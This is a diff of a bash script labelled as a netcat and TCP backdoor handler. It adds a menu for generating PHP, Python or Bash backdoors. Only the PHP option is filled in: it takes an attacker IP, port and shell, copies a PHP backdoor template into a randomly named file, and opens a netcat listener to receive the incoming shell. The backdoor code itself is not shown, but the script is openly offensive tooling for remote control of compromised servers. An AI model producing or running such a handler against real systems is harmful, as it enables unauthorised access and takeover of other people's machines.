@@ -1,6 +1,5 @@
 #!/bin/bash
 
-echo "please report any problem"
 #netcat & tcp backdoor handler
 source ./loading-bar.sh 
 
@@ -133,3 +132,45 @@ else
       exit 0
     fi
 fi
+
+printf "$star starting handler$new"
+loading-bar 5
+
+while :
+do
+echo "
+[1] Make and use PHP backdoor
+[2] Make and use Python backdoor
+[3] Make and use Bash backdoor
+"
+
+read -p "handler: " handler
+
+if [ -z "$handler" ];
+then
+  echo "$star [SPACE]..."
+else
+  if [ $handler == "1" ];
+  then
+    echo "$alrt PHP"
+    read -p "IP: " ip
+    read -p "PORT: " port
+    read -p "SHELL: " shell
+    name="$RANDOM"
+    echo "making PHP backdoor"
+    echo "Keep in mind this backdoor will only work for linux/unix based server's or system"
+    echo "LHOST = $ip"
+    echo "LPORT = $port"
+    echo "NAME = $name"
+    echo "SHELL = $shell"
+    cat PHP-backdoor.php >> $name.php
+    echo "You will now enter nano"
+    echo "ONLY CHANGE WHAT IT WILL TELL YOU"
+    printf "press enter to continue"
+    read
+    nano $name.php
+    echo "started handler"
+    nc -lvp $port 
+  fi
+fi
+done
